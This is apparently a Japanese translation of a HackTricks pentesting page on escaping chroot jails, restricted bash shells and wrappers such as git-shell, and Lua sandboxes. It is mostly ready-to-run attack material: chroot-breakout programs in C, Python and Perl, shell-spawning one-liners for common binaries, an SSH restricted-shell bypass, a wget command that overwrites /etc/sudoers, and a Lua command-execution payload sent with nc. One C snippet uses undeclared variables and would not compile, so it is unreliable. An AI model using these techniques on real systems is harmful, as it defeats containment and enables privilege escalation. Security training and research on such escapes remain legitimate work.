# Jails からの Escape

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**"Shell" property を持つ binary を実行できるか、**[**https://gtfobins.github.io/**](https://gtfobins.github.io) **で検索してください**

## Chroot Escapes

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) より: chroot mechanism は、**特権を持つ** (**root**) **user による意図的な改ざんから防御することを目的としていません**。ほとんどの system では、chroot context は適切に stack されず、**十分な権限を持つ chroot 内の program は、2 回目の chroot を実行して脱出できる場合があります**。\
通常、これは escape に chroot 内で root になる必要があることを意味します。

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) は、以下の scenario を悪用して `chroot` から escape するために作成されました。<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> chroot 内で **root** の場合、**別の chroot を作成して escape できます**。これは (Linux では) 2 つの chroot が共存できないためです。そのため、folder を作成し、**自分がその外側にいる状態で**その新しい folder に対して **新しい chroot を作成**すると、あなたは **新しい chroot の外側にいる**ことになり、したがって FS 内にいることになります。
>
> これは通常、chroot が working directory を指定された場所に移動させないために起こります。そのため、chroot を作成しても、その外側にいることができます。

通常、chroot jail 内に `chroot` binary はありませんが、binary を **compile、upload、execute** することはできます:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> これは前のケースと似ていますが、この場合、**attacker は現在のディレクトリへの file descriptor を保存**してから、**新しいフォルダに chroot を作成**します。最後に、chroot の**外部**でその **FD** に**アクセス**できるため、それにアクセスして **escape** します。

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD は Unix Domain Sockets 経由で渡せるため、以下を行います。
>
> - 子プロセスを作成する（fork）
> - 親プロセスと子プロセスが通信できるように UDS を作成する
> - 子プロセスで別のフォルダーに chroot を実行する
> - 親プロセスで、新しい子プロセスの chroot の外側にあるフォルダーの FD を作成する
> - UDS を使用して、その FD を子プロセスに渡す
> - 子プロセスでその FD に対して chdir する。FD が chroot の外側にあるため、jail から脱出できる

### Root + Mount

> [!WARNING]
>
> - root device (/) を chroot 内のディレクトリに mount する
> - そのディレクトリに chroot する
>
> これは Linux で可能です

### Root + /proc

> [!WARNING]
>
> - chroot 内のディレクトリに procfs を mount する（まだ存在しない場合）
> - /proc/1/root のように、異なる root/cwd エントリを持つ pid を探す
> - そのエントリに chroot する

### Root(?) + Fork

> [!WARNING]
>
> - Fork（子プロセス）を作成し、ファイルシステム内のより深い別のフォルダーに chroot して、そこへ CD する
> - 親プロセスから、子プロセスが存在するフォルダーを、子プロセスの chroot より前のフォルダーへ移動する
> - この子プロセスは chroot の外側にいることを認識する

### ptrace

> [!WARNING]
>
> - 以前は、ユーザーが自身のプロセスを別の自身のプロセスから debug できましたが、現在はデフォルトではできません
> - それでも可能であれば、プロセスに ptrace して、その内部で shellcode を実行できます（[この例を参照](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)）。

## Bash Jails

### Enumeration

jail に関する情報を取得します。
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH の変更

PATH 環境変数を変更できるか確認します<sup>[[2]](#references)</sup。
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vimを使う
```bash
:set shell=/bin/sh
:shell
```
### Pagers と help viewers

多くの制限環境では、依然として **pagers** や **help viewers** が利用可能です。通常、`PATH` を再構築しようとするよりも、これらを悪用するほうが簡単です。
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git` が利用可能な場合、そのヘルプ出力は通常 pager を経由することに注意してください：
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### よくある GTFOBins のワンライナー

アクセス可能なバイナリがわかったら、まずは明らかな shell spawner をテストします：
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
引数を自由に実行するのではなく、許可されたコマンドにのみ**引数を注入**できる場合は、**GTFOArgs**も確認してください。

### スクリプトを作成

内容として _/bin/bash_ を持つ実行可能ファイルを作成できるか確認します。
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH から bash を取得

ssh 経由でアクセスしている場合、制限された login shell の代わりに、サーバーへ**別のプログラム**を実行するよう要求できることがあります。
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh` がローカルで許可されている数少ないバイナリの 1 つである場合、**GTFOBin** として悪用することもできる点に注意してください：
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### 宣言
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

例えば sudoers ファイルを上書きできます。
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

一部の環境では、通常の `rbash` ではなく、`git-shell`、`rssh`、`lshell` などの **wrappers** に接続されます。

- `git-shell` は、server-side Git commands と `~/git-shell-commands/` 内に存在するものだけを受け付けます。そのディレクトリが存在する場合は、`help` を実行して許可されているカスタムアクションを列挙します。そこに**書き込み**できる場合、そのディレクトリに配置した実行可能ファイルはすべて到達可能になります。<sup>[[3]](#references)</sup>
- `rssh` / `lshell` では、通常 `scp`、`sftp`、`rsync`、または Git-style operations のみが許可されます。その場合は、まず**ファイル書き込みプリミティブ**に注目します。`authorized_keys`、shell startup file、または helper script を書き込み可能な場所にアップロードし、その後 `ssh -t ...` で再接続します。
- wrapper が command line のフィルタリングのみを行う場合は、到達可能なバイナリを列挙し、そこから **GTFOBins / GTFOArgs** に戻って pivot します。

### Other tricks

以下も確認してください。

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**次のページも興味深いかもしれません。**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Python jails から escape するための tricks は、次のページにあります。


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

このページでは、Lua 内でアクセスできる global functions を確認できます。[https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
**ドットを使わずにライブラリの関数を呼び出す**ためのいくつかのテクニック：
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
ライブラリの関数を列挙する：
```bash
for k,v in pairs(string) do print(k,v) end
```
なお、前述の one liner を**異なる lua environment で実行するたびに、関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なる lua environment をロードして le library の最初の関数を呼び出す brute force attack を実行できます：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**interactive lua shell を取得**: limited lua shell 内にいる場合、以下を呼び出すことで新しい lua shell（うまくいけば unlimited）を取得できます:
```bash
debug.debug()
```
## 参考文献

- [1] [Chw00t: さまざまな chroot ソリューションから脱出する方法（Bucsay Balazs、DeepSec の講演とスライド）](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – 制限付き Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git ドキュメント](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
